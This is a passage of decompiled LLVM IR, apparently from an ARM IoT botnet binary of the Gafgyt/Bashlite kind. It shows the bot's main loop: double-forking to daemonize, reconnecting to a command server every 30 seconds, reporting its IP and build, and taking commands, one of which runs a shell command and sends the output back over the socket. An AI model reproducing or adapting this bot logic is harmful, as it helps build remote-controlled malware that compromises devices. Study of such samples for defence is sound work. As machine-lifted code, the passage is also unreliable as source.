  %v1_12060 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_12068.outer

dec_label_pc_12068.outer:                         ; preds = %dec_label_pc_1205c, %dec_label_pc_11fe0
  %stack_var_-80.0.ph = phi i32 [ %v1_12060, %dec_label_pc_1205c ], [ 0, %dec_label_pc_11fe0 ]
  br label %dec_label_pc_12068

dec_label_pc_12068:                               ; preds = %dec_label_pc_12068.outer, %dec_label_pc_12018
  %v2_1206c = call i32 @feof(i16* %v1_1206c)
  %v2_12074 = icmp eq i32 %v2_1206c, 0
  br i1 %v2_12074, label %dec_label_pc_12018, label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %dec_label_pc_12068
  %v2_12080 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_1208c = call i32 @__GI_fclose(i16* %v1_1206c)
  br i1 %v2_12080, label %dec_label_pc_12088, label %dec_label_pc_120e0

dec_label_pc_12088:                               ; preds = %dec_label_pc_1207c
  %v4_12090 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_12090, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_20350.808 to i32), i32* @r1, align 4
  %v3_12098 = call i32 @__GI_fopen(i32 %v4_12090, i32 ptrtoint (i32* @global_var_20350.808 to i32))
  %v2_120a8 = icmp eq i32 %v3_12098, 0
  br i1 %v2_120a8, label %dec_label_pc_120e0, label %dec_label_pc_120b0

dec_label_pc_120b0:                               ; preds = %dec_label_pc_12088
  %v2_120bc = call i32 @__GI_fputs(i32 %v2_11ffc, i32 %v3_12098)
  %v1_120c4 = inttoptr i32 %v3_12098 to i16*
  %v2_120c4 = call i32 @__GI_fclose(i16* %v1_120c4)
  br label %dec_label_pc_120e0

dec_label_pc_120d8:                               ; preds = %dec_label_pc_11f50
  %v1_120dc = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_120dc = call i32 @__GI_fclose(i16* %v1_120dc)
  br label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %dec_label_pc_1207c, %dec_label_pc_12088, %dec_label_pc_11f44, %dec_label_pc_120b0, %dec_label_pc_120d8
  %v0_120e0 = call i32 @getOurIP()
  store i32 %v0_120e0, i32* @r0, align 4
  %v0_120e4 = call i32 @__libc_fork()
  store i32 %v0_120e4, i32* @r0, align 4
  %v2_120f4 = icmp eq i32 %v0_120e4, 0
  br i1 %v2_120f4, label %dec_label_pc_12124, label %dec_label_pc_12160

dec_label_pc_12124:                               ; preds = %dec_label_pc_120e0
  %v0_12124 = call i32 @__libc_fork()
  store i32 %v0_12124, i32* @r0, align 4
  %v2_12134 = icmp eq i32 %v0_12124, 0
  br i1 %v2_12134, label %dec_label_pc_12144.thread, label %dec_label_pc_12150

dec_label_pc_12144.thread:                        ; preds = %dec_label_pc_12124
  br label %dec_label_pc_1216c

dec_label_pc_12150:                               ; preds = %dec_label_pc_12124
  %v1_12140 = call i32 @__GI_exit(i32 0)
  %v2_12158 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_20354.810 to i32))
  store i32 %v2_12158, i32* @r0, align 4
  br label %dec_label_pc_1216c

dec_label_pc_12160:                               ; preds = %dec_label_pc_120e0
  %v2_120fc = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v0_120e4, i32* @r0, align 4
  store i32 %v2_120fc, i32* @r1, align 4
  %v3_1210c = call i32 @__libc_waitpid(i32 %v0_120e4, i32 %v2_120fc, i32 0)
  %v1_12114 = call i32 @__GI_exit(i32 0)
  %v2_12168 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_20354.810 to i32))
  store i32 %v2_12168, i32* @r0, align 4
  br label %dec_label_pc_1216c

dec_label_pc_1216c:                               ; preds = %dec_label_pc_12144.thread, %dec_label_pc_12150, %dec_label_pc_12160
  %v0_1216c = call i32 @__GI_setsid()
  %v1_12174 = call i32 @chdir(i32 ptrtoint (i32* @global_var_20344.804 to i32))
  %v2_12180 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_12a14 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_12a24 = bitcast i32* %stack_var_-5744 to i8*
  %v2_12780 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_12790 = bitcast i32* %stack_var_-1648 to i8*
  %v1_12610 = or i32 %v2_12a14, 1
  %v5_12614 = inttoptr i32 %v1_12610 to i8*
  %v2_128e4 = add i32 %v19_11dfc, -600
  br label %dec_label_pc_12184.outer

dec_label_pc_12184.outer:                         ; preds = %dec_label_pc_12568, %dec_label_pc_12a04, %dec_label_pc_1216c
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_1216c ], [ %stack_var_-96.2.ph, %dec_label_pc_12a04 ], [ %v1_1256c, %dec_label_pc_12568 ]
  %v0_1218424 = call i32 @initConnection()
  %v2_1218c26 = icmp eq i32 %v0_1218424, 0
  br i1 %v2_1218c26, label %dec_label_pc_121a0, label %dec_label_pc_12194

dec_label_pc_12194:                               ; preds = %dec_label_pc_12184.outer, %dec_label_pc_12194
  %v1_12198 = call i32 @sleep(i32 30)
  %v0_12184 = call i32 @initConnection()
  %v2_1218c = icmp eq i32 %v0_12184, 0
  br i1 %v2_1218c, label %dec_label_pc_121a0, label %dec_label_pc_12194

dec_label_pc_121a0:                               ; preds = %dec_label_pc_12194, %dec_label_pc_12184.outer
  %v2_121a4 = load i32, i32* @global_var_2a530.50, align 4
  store i32 %v2_121a4, i32* @r4, align 4
  %v0_121a8 = call i32 @getBuild()
  store i32 %v0_121a8, i32* @r5, align 4
  %v2_121b4 = load i32, i32* @global_var_3078c.483, align 4
  store i32 %v2_121b4, i32* @r0, align 4
  %v1_121b8 = call i32 @__GI_inet_ntoa(i32 %v2_121b4)
  %v0_121c0 = load i32, i32* @r4, align 4
  %v0_121c8 = load i32, i32* @r5, align 4
  store i32 %v0_121c8, i32* @r2, align 4
  %v3_121cc = call i32 @sockprintf(i32 %v0_121c0, i32 ptrtoint ([12 x i8]* @global_var_20364.814 to i32))
  br label %dec_label_pc_12a04.outer

dec_label_pc_121f0:                               ; preds = %dec_label_pc_124a4, %dec_label_pc_12450
  %v3_121f4 = mul i32 %v3_12498, 4
  %v2_12200 = load i32, i32* @global_var_30798.71, align 4
  %v2_12204 = add i32 %v2_12200, %v3_121f4
  %v1_12208 = inttoptr i32 %v2_12204 to i32*
  %v2_12208 = load i32, i32* %v1_12208, align 4
  store i32 %v2_12208, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v3_12218 = call i32 @__libc_waitpid(i32 %v2_12208, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_12218, 1
  br i1 %tmp111, label %dec_label_pc_12444, label %dec_label_pc_1227c

dec_label_pc_12238:                               ; preds = %dec_label_pc_122d8, %dec_label_pc_1227c
  %v2_1223c = load i32, i32* @global_var_30798.71, align 4
  %v3_12248 = mul i32 %v1_1222c, 4
  %v1_12240 = add i32 %v3_12248, -4
  %v2_1224c = add i32 %v1_12240, %v2_1223c
  %v2_12264 = add i32 %v2_1223c, %v3_12248
  %v1_12268 = inttoptr i32 %v2_12264 to i32*
  %v2_12268 = load i32, i32* %v1_12268, align 4
  %v2_1226c = inttoptr i32 %v2_1224c to i32*
  store i32 %v2_12268, i32* %v2_1226c, align 4
  br label %dec_label_pc_1227c

dec_label_pc_1227c:                               ; preds = %dec_label_pc_121f0, %dec_label_pc_12238
  %v3_12228.sink = phi i32 [ %v1_1222c, %dec_label_pc_12238 ], [ %v3_12498, %dec_label_pc_121f0 ]
  %v1_1222c = add i32 %v3_12228.sink, 1
  %v2_12298 = load i32, i32* @global_var_2a538.68, align 4
  %v5_12298 = load i32, i32* @global_var_2a53c.69, align 4
  %tmp112 = icmp ugt i32 %v5_12298, %v1_1222c
  br i1 %tmp112, label %dec_label_pc_12238, label %dec_label_pc_122c0

dec_label_pc_122c0:                               ; preds = %dec_label_pc_1227c
  %v9_122d0 = icmp eq i32 %v5_12298, %v1_1222c
  br i1 %v9_122d0, label %dec_label_pc_122d8, label %dec_label_pc_122f0

dec_label_pc_122d8:                               ; preds = %dec_label_pc_122c0
  %v9_122e8 = icmp eq i32 %v2_12298, 0
  br i1 %v9_122e8, label %dec_label_pc_122f0, label %dec_label_pc_12238

dec_label_pc_122f0:                               ; preds = %dec_label_pc_122d8, %dec_label_pc_122c0
  %v2_122f4 = load i32, i32* @global_var_30798.71, align 4
  %v3_12300 = mul i32 %v1_1222c, 4
  %v1_122f8 = add i32 %v3_12300, -4
  %v2_12304 = add i32 %v1_122f8, %v2_122f4
  %v2_1230c = inttoptr i32 %v2_12304 to i32*
  store i32 0, i32* %v2_1230c, align 4
  %v2_12314 = load i32, i32* @global_var_2a538.68, align 4
  %v5_12314 = load i32, i32* @global_var_2a53c.69, align 4
  %v2_12320 = add i32 %v2_12314, -1
  %v3_12320 = icmp ne i32 %v2_12314, 0
  %v3_12324 = add i32 %v5_12314, -1
  %v4_12324 = zext i1 %v3_12320 to i32
  %v5_12324 = add i32 %v3_12324, %v4_12324
  store i32 %v2_12320, i32* @global_var_2a538.68, align 4
  store i32 %v5_12324, i32* @global_var_2a53c.69, align 4
  %v3_12340 = icmp eq i32 %v2_12314, 0
  %v4_12344 = zext i1 %v3_12340 to i32
  %v5_12344 = add i32 %v5_12324, %v4_12344
  %v3_12348 = udiv i32 %v2_12314, 1073741824
  %v3_1234c = mul i32 %v5_12344, 4
  %v2_12350 = or i32 %v3_1234c, %v3_12348
  store i32 %v2_12350, i32* @r4, align 4
  %v3_12354 = mul i32 %v2_12314, 4
  %v1_1235c = call i32 @malloc(i32 %v3_12354)
  br label %dec_label_pc_123b4

dec_label_pc_12374:                               ; preds = %dec_label_pc_12410, %dec_label_pc_123b4
  %v3_12378 = mul i32 %v3_12404, 4
  %v2_12384 = add i32 %v3_12378, %v1_1235c
  %v2_12398 = load i32, i32* @global_var_30798.71, align 4
  %v2_1239c = add i32 %v2_12398, %v3_12378
  %v1_123a0 = inttoptr i32 %v2_1239c to i32*
  %v2_123a0 = load i32, i32* %v1_123a0, align 4
  %v2_123a4 = inttoptr i32 %v2_12384 to i32*
  store i32 %v2_123a0, i32* %v2_123a4, align 4
  %v1_123ac = add i32 %v3_12404, 1
  br label %dec_label_pc_123b4

dec_label_pc_123b4:                               ; preds = %dec_label_pc_122f0, %dec_label_pc_12374
  %v3_12404 = phi i32 [ 0, %dec_label_pc_122f0 ], [ %v1_123ac, %dec_label_pc_12374 ]
  %v2_123d0 = load i32, i32* @global_var_2a538.68, align 4
  %v5_123d0 = load i32, i32* @global_var_2a53c.69, align 4
  %tmp114 = icmp ugt i32 %v5_123d0, %v3_12404
  br i1 %tmp114, label %dec_label_pc_12374, label %dec_label_pc_123f8

dec_label_pc_123f8:                               ; preds = %dec_label_pc_123b4
  %v9_12408 = icmp eq i32 %v5_123d0, %v3_12404
  br i1 %v9_12408, label %dec_label_pc_12410, label %dec_label_pc_12428

dec_label_pc_12410:                               ; preds = %dec_label_pc_123f8
  %v9_12420 = icmp eq i32 %v2_123d0, 0
  br i1 %v9_12420, label %dec_label_pc_12428, label %dec_label_pc_12374

dec_label_pc_12428:                               ; preds = %dec_label_pc_12410, %dec_label_pc_123f8
  %v2_1242c = load i32, i32* @global_var_30798.71, align 4
  store i32 %v2_1242c, i32* @r0, align 4
  %v0_12434 = call i32 @free()
  store i32 %v1_1235c, i32* @global_var_30798.71, align 4
  br label %dec_label_pc_12444

dec_label_pc_12444:                               ; preds = %dec_label_pc_121f0, %dec_label_pc_12428
  %v1_12448 = add i32 %v3_12498, 1
  br label %dec_label_pc_12450

dec_label_pc_12450:                               ; preds = %dec_label_pc_12a04, %dec_label_pc_12444
  %v3_12498 = phi i32 [ %v1_12448, %dec_label_pc_12444 ], [ 0, %dec_label_pc_12a04 ]
  %v3_12458 = ashr i32 %v3_12498, 31
  %v2_12468 = load i32, i32* @global_var_2a538.68, align 4
  %v5_12468 = load i32, i32* @global_var_2a53c.69, align 4
  %v3_12484 = icmp uge i32 %v5_12468, %v3_12498
  %v9_12484 = icmp eq i32 %v5_12468, %v3_12498
  %v2_12488 = xor i1 %v9_12484, true
  %v3_12488 = and i1 %v3_12484, %v2_12488
  br i1 %v3_12488, label %dec_label_pc_121f0, label %dec_label_pc_1248c

dec_label_pc_1248c:                               ; preds = %dec_label_pc_12450
  br i1 %v9_12484, label %dec_label_pc_124a4, label %dec_label_pc_124bc

dec_label_pc_124a4:                               ; preds = %dec_label_pc_1248c
  %tmp = icmp ugt i32 %v2_12468, %v3_12458
  br i1 %tmp, label %dec_label_pc_121f0, label %dec_label_pc_124bc

dec_label_pc_124bc:                               ; preds = %dec_label_pc_1248c, %dec_label_pc_124a4
  %v2_124d0 = add i32 %v5_12a24, %v2_12a14
  %v3_124d8 = inttoptr i32 %v2_124d0 to i8*
  store i8 0, i8* %v3_124d8, align 1
  %v2_124ec = call i32 @trim(i8* %v4_12a24)
  %v4_12504 = call i32 @strstr(i32 %v2_12a14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ee88.52, i32 0, i32 0))
  store i32 %v4_12504, i32* @r2, align 4
  %v9_12518 = icmp eq i32 %v4_12504, %v2_12a14
  br i1 %v9_12518, label %dec_label_pc_12520, label %dec_label_pc_12538

dec_label_pc_12520:                               ; preds = %dec_label_pc_124bc
  %v2_12524 = load i32, i32* @global_var_2a530.50, align 4
  %v3_12530 = call i32 @sockprintf(i32 %v2_12524, i32 ptrtoint ([5 x i8]* @global_var_20370.819 to i32))
  br label %dec_label_pc_12a04

dec_label_pc_12538:                               ; preds = %dec_label_pc_124bc
  %v6_1254c = call i32 @strstr(i32 %v2_12a14, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20378.821, i32 0, i32 0))
  %v9_12560 = icmp eq i32 %v6_1254c, %v2_12a14
  br i1 %v9_12560, label %dec_label_pc_12568, label %dec_label_pc_12594

dec_label_pc_12568:                               ; preds = %dec_label_pc_12538
  %v1_1256c = add i32 %stack_var_-96.2.ph, 1
  %v2_1257c = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_2037c.823 to i32))
  %v7_12588 = icmp slt i32 %v1_1256c, 21
  br i1 %v7_12588, label %dec_label_pc_12184.outer, label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %dec_label_pc_12568
  %v1_12590 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12594

dec_label_pc_12594:                               ; preds = %dec_label_pc_12538, %dec_label_pc_1258c
  %stack_var_-96.1 = phi i32 [ %v1_1256c, %dec_label_pc_1258c ], [ %stack_var_-96.2.ph, %dec_label_pc_12538 ]
  %v2_125a8 = load i8, i8* %v4_12a24, align 4
  %v7_125ac = icmp eq i8 %v2_125a8, 33
  br i1 %v7_125ac, label %dec_label_pc_125d0, label %dec_label_pc_12a04.outer

dec_label_pc_125d0:                               ; preds = %dec_label_pc_12594, %dec_label_pc_125e0
  %v3_125b4.sink = phi i8* [ %storemerge8, %dec_label_pc_125e0 ], [ %v4_12a24, %dec_label_pc_12594 ]
  %v4_125b4 = ptrtoint i8* %v3_125b4.sink to i32
  %v1_125b8 = add i32 %v4_125b4, 1
  %storemerge8 = inttoptr i32 %v1_125b8 to i8*
  %v2_125d4 = load i8, i8* %storemerge8, align 1
  %v7_125d8 = icmp eq i8 %v2_125d4, 32
  br i1 %v7_125d8, label %dec_label_pc_125f0, label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125d0
  %v2_125e4 = load i8, i8* %storemerge8, align 1
  %v2_125e8 = icmp eq i8 %v2_125e4, 0
  br i1 %v2_125e8, label %dec_label_pc_125f0, label %dec_label_pc_125d0

dec_label_pc_125f0:                               ; preds = %dec_label_pc_125e0, %dec_label_pc_125d0
  %v2_125f4 = load i8, i8* %storemerge8, align 1
  %v2_125f8 = icmp eq i8 %v2_125f4, 0
  br i1 %v2_125f8, label %dec_label_pc_12a04.outer, label %dec_label_pc_12600

dec_label_pc_12600:                               ; preds = %dec_label_pc_125f0
  store i8 0, i8* %storemerge8, align 1
  %v3_12620 = call i32 @strlen(i8* %v5_12614)
  %v2_12630 = add i32 %v3_12620, %v2_12a14
  %v1_12634 = add i32 %v2_12630, 2
  %v5_12638 = inttoptr i32 %v1_12634 to i8*
  %v1_12668 = add i32 %v2_12630, 1
  br label %dec_label_pc_12664

dec_label_pc_12640:                               ; preds = %dec_label_pc_1268c, %dec_label_pc_12664
  %v3_12650 = call i32 @strlen(i8* %v5_12638)
  %v2_12658 = add i32 %v1_12668, %v3_12650
  %v3_12660 = inttoptr i32 %v2_12658 to i8*
  store i8 0, i8* %v3_12660, align 1
  br label %dec_label_pc_12664

dec_label_pc_12664:                               ; preds = %dec_label_pc_12600, %dec_label_pc_12640
  %v3_12674 = call i32 @strlen(i8* %v5_12638)
  %v2_1267c = add i32 %v1_12668, %v3_12674
  %v1_12680 = inttoptr i32 %v2_1267c to i8*
  %v2_12680 = load i8, i8* %v1_12680, align 1
  %v7_12684 = icmp eq i8 %v2_12680, 10
  br i1 %v7_12684, label %dec_label_pc_12640, label %dec_label_pc_1268c

dec_label_pc_1268c:                               ; preds = %dec_label_pc_12664
  store i32 %v1_12668, i32* @r4, align 4
  %v3_1269c = call i32 @strlen(i8* %v5_12638)
  %v0_126a4 = load i32, i32* @r4, align 4
  %v2_126a4 = add i32 %v0_126a4, %v3_1269c
  %v1_126a8 = inttoptr i32 %v2_126a4 to i8*
  %v2_126a8 = load i8, i8* %v1_126a8, align 1
  %v7_126ac = icmp eq i8 %v2_126a8, 13
  br i1 %v7_126ac, label %dec_label_pc_12640, label %dec_label_pc_126b4

dec_label_pc_126b4:                               ; preds = %dec_label_pc_1268c
  %v2_126d028 = load i8, i8* %v5_12638, align 1
  %v7_126d432 = icmp eq i8 %v2_126d028, 32
  br i1 %v7_126d432, label %dec_label_pc_126ec, label %dec_label_pc_126dc

dec_label_pc_126c0:                               ; preds = %dec_label_pc_126dc
  %v1_126c4 = add i32 %v4_126cc34, 1
  %v5_126c8 = inttoptr i32 %v1_126c4 to i8*
  %v2_126d0 = load i8, i8* %v5_126c8, align 1
  %v7_126d4 = icmp eq i8 %v2_126d0, 32
  br i1 %v7_126d4, label %dec_label_pc_126ec, label %dec_label_pc_126dc

dec_label_pc_126dc:                               ; preds = %dec_label_pc_126b4, %dec_label_pc_126c0
  %v4_126cc34 = phi i32 [ %v1_126c4, %dec_label_pc_126c0 ], [ %v1_12634, %dec_label_pc_126b4 ]
  %stack_var_-64.033 = phi i8* [ %v5_126c8, %dec_label_pc_126c0 ], [ %v5_12638, %dec_label_pc_126b4 ]
  %v2_126e0 = load i8, i8* %stack_var_-64.033, align 1
  %v2_126e4 = icmp eq i8 %v2_126e0, 0
  br i1 %v2_126e4, label %dec_label_pc_126ec, label %dec_label_pc_126c0

dec_label_pc_126ec:                               ; preds = %dec_label_pc_126c0, %dec_label_pc_126dc, %dec_label_pc_126b4
  %stack_var_-64.0.lcssa = phi i8* [ %v5_12638, %dec_label_pc_126b4 ], [ %v5_126c8, %dec_label_pc_126c0 ], [ %stack_var_-64.033, %dec_label_pc_126dc ]
  %v4_126cc.lcssa = phi i32 [ %v1_12634, %dec_label_pc_126b4 ], [ %v1_126c4, %dec_label_pc_126c0 ], [ %v4_126cc34, %dec_label_pc_126dc ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_126fc = add i32 %v4_126cc.lcssa, 1
  %v2_1274039 = load i8, i8* %v5_12638, align 1
  %v2_1274441 = icmp eq i8 %v2_1274039, 0
  br i1 %v2_1274441, label %dec_label_pc_1274c, label %dec_label_pc_12710

dec_label_pc_12710:                               ; preds = %dec_label_pc_126ec, %dec_label_pc_12710
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_12710 ], [ %v5_12638, %dec_label_pc_126ec ]
  %storemerge1442 = phi i32 [ %v1_12734, %dec_label_pc_12710 ], [ %v1_12634, %dec_label_pc_126ec ]
  %v2_12714 = load i8, i8* %storemerge743, align 1
  %v3_12714 = zext i8 %v2_12714 to i32
  %v1_1271c = call i32 @__GI_toupper(i32 %v3_12714)
  %v1_1272c = trunc i32 %v1_1271c to i8
  store i8 %v1_1272c, i8* %storemerge743, align 1
  %v1_12734 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_12734 to i8*
  %v2_12740 = load i8, i8* %storemerge7, align 1
  %v2_12744 = icmp eq i8 %v2_12740, 0
  br i1 %v2_12744, label %dec_label_pc_1274c, label %dec_label_pc_12710

dec_label_pc_1274c:                               ; preds = %dec_label_pc_12710, %dec_label_pc_126ec
  store i32 ptrtoint ([3 x i8]* @global_var_20390.825 to i32), i32* @r1, align 4
  %v4_12758 = call i32 @__GI_strcoll(i8* %v5_12638, i32 ptrtoint ([3 x i8]* @global_var_20390.825 to i32))
  store i32 %v4_12758, i32* @r0, align 4
  %v2_12760 = icmp eq i32 %v4_12758, 0
  br i1 %v2_12760, label %dec_label_pc_12768, label %dec_label_pc_12870

dec_label_pc_12768:                               ; preds = %dec_label_pc_1274c
  %v0_12768 = call i32 @listFork()
  %v2_12770 = icmp eq i32 %v0_12768, 0
  br i1 %v2_12770, label %dec_label_pc_12778, label %dec_label_pc_12a04.outer

dec_label_pc_12778:                               ; preds = %dec_label_pc_12768
  store i32 1024, i32* @r2, align 4
  %v3_12790 = call i32 @__GI_memset(i8* %v2_12790, i32 0)
  %v6_127b0 = call i32 @szprintf(i32 %v2_12780, i32 ptrtoint ([8 x i8]* @global_var_20394.827 to i32), i32 %v1_126fc, i32 %v2_12780, i32 ptrtoint (i32* @0 to i32))
  %v3_127cc = call i32 @fdpopen(i32 %v2_12780, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_20330.800, i32 0, i32 0))
  br label %dec_label_pc_12838

dec_label_pc_127dc:                               ; preds = %dec_label_pc_12838
  %v2_127ec = call i32 @trim(i8* %v2_12790)
  %v2_127f4 = load i32, i32* @global_var_2a530.50, align 4
  store i32 %v2_12780, i32* @r2, align 4
  %v3_12810 = call i32 @sockprintf(i32 %v2_127f4, i32 ptrtoint ([3 x i8]* @global_var_2039c.829 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_1282c = call i32 @__GI_memset(i8* %v2_12790, i32 0)
  %v1_12834 = call i32 @sleep(i32 1)
  br label %dec_label_pc_12838

dec_label_pc_12838:                               ; preds = %dec_label_pc_12778, %dec_label_pc_127dc
  %v4_12850 = call i32 @fdgets(i32 %v2_12780, i32 1024, i32 %v3_127cc, i32 %v2_12780)
  %v2_12858 = icmp eq i32 %v4_12850, 0
  br i1 %v2_12858, label %dec_label_pc_12860, label %dec_label_pc_127dc

dec_label_pc_12860:                               ; preds = %dec_label_pc_12838
  %v1_12864 = call i32 @fdpclose(i32 %v3_127cc)
  %v1_1286c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12870

dec_label_pc_12870:                               ; preds = %dec_label_pc_1274c, %dec_label_pc_12860
  store i32 ptrtoint (i32* @global_var_203a0.831 to i32), i32* @r1, align 4
  %v2_12884 = call i32 @__GI_strtok(i32 %v1_126fc, i32 ptrtoint (i32* @global_var_203a0.831 to i32))
  store i32 %v1_12634, i32* %stack_var_-624, align 4
  %v2_1298846 = icmp eq i32 %v2_12884, 0
  br i1 %v2_1298846, label %dec_label_pc_12990, label %dec_label_pc_1289c

dec_label_pc_1289c:                               ; preds = %dec_label_pc_12870, %dec_label_pc_12970
  %stack_var_-36.049.in = phi i32 [ %v2_12978, %dec_label_pc_12970 ], [ %v2_12884, %dec_label_pc_12870 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_12970 ], [ 1, %dec_label_pc_12870 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_128a0 = load i8, i8* %stack_var_-36.049, align 1
  %v7_128a4 = icmp eq i8 %v2_128a0, 10
  br i1 %v7_128a4, label %dec_label_pc_12970, label %dec_label_pc_128ac

dec_label_pc_128ac:                               ; preds = %dec_label_pc_1289c
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_128b8 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_128c0 = add i32 %v3_128b8, 1
  %v1_128c8 = call i32 @malloc(i32 %v1_128c0)
  %v0_128dc = load i32, i32* @r4, align 4
  %v3_128dc = mul i32 %v0_128dc, 4
  %v2_128e8 = add i32 %v2_128e4, %v3_128dc
  %v2_128ec = inttoptr i32 %v2_128e8 to i32*
  store i32 %v1_128c8, i32* %v2_128ec, align 4
  %v3_128fc = mul i32 %stack_var_-40.147, 4
  %v2_12904 = add i32 %v3_128fc, %v19_11dfc
  %v2_12908 = add i32 %v2_12904, -600
  %v1_1290c = inttoptr i32 %v2_12908 to i32*
  %v2_1290c = load i32, i32* %v1_1290c, align 4
  store i32 %v2_1290c, i32* @r4, align 4
  %v3_12918 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_12920 = add i32 %v3_12918, 1
  %v0_12924 = load i32, i32* @r4, align 4
  store i32 %v1_12920, i32* @r2, align 4
  %v2_12930 = inttoptr i32 %v0_12924 to i8*
  %v3_12930 = call i32 @__GI_memset(i8* %v2_12930, i32 0)
  %v2_12950 = load i32, i32* %v1_1290c, align 4
  store i32 %stack_var_-36.049.in, i32* @r1, align 4
  %v3_12960 = inttoptr i32 %v2_12950 to i8*
  %v4_12960 = call i32 @strcpy(i8* %v3_12960, i32 %stack_var_-36.049.in)
  %v1_12968 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_12970

dec_label_pc_12970:                               ; preds = %dec_label_pc_1289c, %dec_label_pc_128ac
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_1289c ], [ %v1_12968, %dec_label_pc_128ac ]
  store i32 ptrtoint (i32* @global_var_203a0.831 to i32), i32* @r1, align 4
  %v2_12978 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_203a0.831 to i32))
  %v2_12988 = icmp eq i32 %v2_12978, 0
  br i1 %v2_12988, label %dec_label_pc_12990, label %dec_label_pc_1289c

dec_label_pc_12990:                               ; preds = %dec_label_pc_12970, %dec_label_pc_12870
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_12870 ], [ %stack_var_-40.0, %dec_label_pc_12970 ]
  %v3_1299c = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_129a8 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_129a8, label %dec_label_pc_12a04.outer, label %dec_label_pc_129c0.lr.ph

dec_label_pc_129c0.lr.ph:                         ; preds = %dec_label_pc_12990
  br label %dec_label_pc_129c0

dec_label_pc_129c0:                               ; preds = %dec_label_pc_129c0.lr.ph, %dec_label_pc_129c0
  %storemerge15128 = phi i32 [ 1, %dec_label_pc_129c0.lr.ph ], [ %v1_129ec, %dec_label_pc_129c0 ]
  %v3_129cc = mul i32 %storemerge15128, 4
  %v2_129d4 = add i32 %v3_129cc, %v19_11dfc
  %v2_129d8 = add i32 %v2_129d4, -600
  %v1_129dc = inttoptr i32 %v2_129d8 to i32*
  %v2_129dc = load i32, i32* %v1_129dc, align 4
  store i32 %v2_129dc, i32* @r0, align 4
  %v0_129e4 = call i32 @free()
  %v1_129ec = add nuw nsw i32 %storemerge15128, 1
  %v5_12a00 = icmp slt i32 %v1_129ec, %stack_var_-40.1.lcssa
  br i1 %v5_12a00, label %dec_label_pc_129c0, label %dec_label_pc_12a04.outer

dec_label_pc_12a04.outer:                         ; preds = %dec_label_pc_129c0, %dec_label_pc_12594, %dec_label_pc_12768, %dec_label_pc_12990, %dec_label_pc_125f0, %dec_label_pc_121a0
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_121a0 ], [ %stack_var_-96.1, %dec_label_pc_125f0 ], [ %stack_var_-96.1, %dec_label_pc_12990 ], [ %stack_var_-96.1, %dec_label_pc_12768 ], [ %stack_var_-96.1, %dec_label_pc_12594 ], [ %stack_var_-96.1, %dec_label_pc_129c0 ]
  br label %dec_label_pc_12a04

dec_label_pc_12a04:                               ; preds = %dec_label_pc_12a04.outer, %dec_label_pc_12520
  %v2_12a08 = load i32, i32* @global_var_2a530.50, align 4
  %v5_12a24 = call i32 @recvLine(i32 %v2_12a08, i8* %v4_12a24, i32 4096, i32 %v2_12a14)
  %v3_12a34 = icmp eq i32 %v5_12a24, -1
  br i1 %v3_12a34, label %dec_label_pc_12184.outer, label %dec_label_pc_12450

; uselistorder directives
  uselistorder i32 %v5_12a24, { 1, 0 }
  uselistorder i32 %storemerge15128, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_12978, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_12734, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_126fc, { 1, 0 }
  uselistorder i32 %v1_12668, { 2, 1, 0 }
  uselistorder i8* %v5_12638, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_12634, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_1256c, { 1, 2, 0 }
  uselistorder i1 %v9_12484, { 1, 0 }
  uselistorder i32 %v3_12498, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_123d0, { 1, 0 }
  uselistorder i32 %v3_12404, { 1, 2, 0, 3 }
